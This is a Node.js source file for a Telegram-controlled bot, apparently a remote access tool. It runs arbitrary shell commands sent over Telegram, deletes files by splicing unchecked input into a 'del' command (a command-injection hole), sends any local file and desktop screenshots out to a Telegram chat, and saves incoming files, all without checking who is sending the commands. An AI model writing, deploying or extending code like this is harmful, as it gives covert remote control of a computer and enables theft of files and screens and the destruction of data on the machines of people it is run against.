const TelegramBot = require('node-telegram-bot-api');
const exec = require('child_process').exec;
const fs = require('fs');
const screenshot = require('screenshot-desktop');
const path = require('path');
const executive = require('executive');
const config = require('./config.js');




const token = config.token;
const chatId = config.chatId;

let bot = new TelegramBot(token, {polling: true});

bot.onText(/del (.+)/, (msg, match) => {
    exec('del '+match[1]);
    bot.sendMessage(chatId, `File ${match[1]} deleted.`);
});

bot.onText(/download_file (.+)/, (msg, match) => {
    bot.sendDocument(chatId,match[1]);
});

bot.onText(/list (.+)/, (msg, match) => {

    fs.readdir(match[1], (err, files) => {
        console.log(files);
        if (err) bot.sendMessage(chatId,'Directory not found');
        let list = '';
        files.forEach( file => {
            list += file + "\n";
        });
        bot.sendMessage(chatId, list);
    });

});

bot.onText(/screen/, () => {
    screenshot().then((img) => {
        fs.writeFile(path.join(__dirname,'out','out.jpg'),
            img,
            function (err) {
            if (err) {
                throw err
            }
            bot.sendDocument(chatId, path.join(__dirname,'out','out.jpg'));
            console.log('written to out.jpg');
        })
    }).catch((err) => {
        throw err
    })
});

// Download file on local computer
bot.on('document',msg => {
    fileId = msg.document.file_id;
    console.log(fileId);
    bot.downloadFile(fileId, path.join(__dirname,'download'));
});

//Execute command from cmd
bot.onText(/exec (.+)/,(msg, match) => {
    executive(match[1]);
})
